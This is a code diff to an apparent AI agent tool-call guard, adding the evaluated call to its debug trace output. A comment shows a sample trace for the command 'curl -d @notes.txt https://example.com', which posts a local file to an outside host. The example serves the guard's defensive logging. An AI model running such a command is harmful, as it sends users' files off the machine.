@@ -180,6 +180,7 @@ function bandOf(rule: Rule, score: RuleScore | undefined, useLlm: boolean): Band
 }
 
 // One call's debug lines, shown together as one notification — one line per stage that ran:
+//   [omp-warden]       call: bash: curl -d @notes.txt https://example.com
 //   [omp-warden] classifier: ASK auto-mode: .60, data-exfiltration: .11 b.01 360ms
 //   [omp-warden]        llm: ALLOW data-exfiltration: output stays local 3800ms
 interface Trace {
@@ -244,9 +245,9 @@ function emitDebug(config: Config, _trace: Trace, message: string): void {
 }
 
 // When `debug` is on: the call's stage lines, to DEBUG_LOG and as one omp notification (stderr when
-// the host has no notifier). Nothing when no stage ran.
+// the host has no notifier). Nothing when no stage ran (only the call line).
 function emitSummary(config: Config, ctx: DeciderContext, trace: Trace): void {
-  if (!config.debug || trace.lines.length === 0) {
+  if (!config.debug || trace.lines.length < 2) {
     return;
   }
   const width = Math.max(...trace.lines.map(([label]) => label.length));
@@ -415,6 +416,8 @@ async function decideTraced(config: Config, engine: Engine, event: ToolCallEvent
   const allowForSession = () => {
     session.add(key);
   };
+  // The call being evaluated, on one line.
+  trace.lines.push(["call", `${tool}: ${clip(subject.replace(/\s+/g, " "), 100)}`]);
   if (session.has(key)) {
     trace.lines.push(["session", "ALLOW allowed earlier in this session"]);
     return undefined;
